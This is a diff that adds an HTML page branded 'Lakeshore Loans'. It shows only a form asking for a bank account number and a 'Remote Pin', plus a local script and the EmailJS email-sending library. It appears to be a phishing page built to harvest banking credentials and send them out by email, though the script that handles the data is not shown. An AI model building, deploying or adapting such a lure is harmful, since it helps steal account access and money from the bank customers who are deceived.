@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Lakeshore Loans | Welcome</title>
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="stylesheet" href="./fontawesome-free-5.15.4-web/css/all.css" />
+    <link rel="shortcut icon" href="./images/logo-2.png" type="image/x-icon" />
+  </head>
+
+  <body>
+    <div class="container">
+      <img src="./images/logo-2.png" alt="" />
+
+      <div class="form-contain">
+        <form id="app-form">
+          <div class="form-group">
+            <label for="account_no"> Account No <span>*</span> </label>
+
+            <input
+              autofocus
+              id="account_no"
+              type="number"
+              class="form-control"
+              required
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="remote_pin">Remote Pin <span>*</span></label>
+
+            <input
+              required
+              type="password"
+              class="form-control"
+              id="remote_pin"
+            />
+          </div>
+
+          <button type="submit" id="send-btn">
+            Submit <i class="fa fa-arrow-right icon"></i>
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <script src="./app.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+  </body>
+</html>
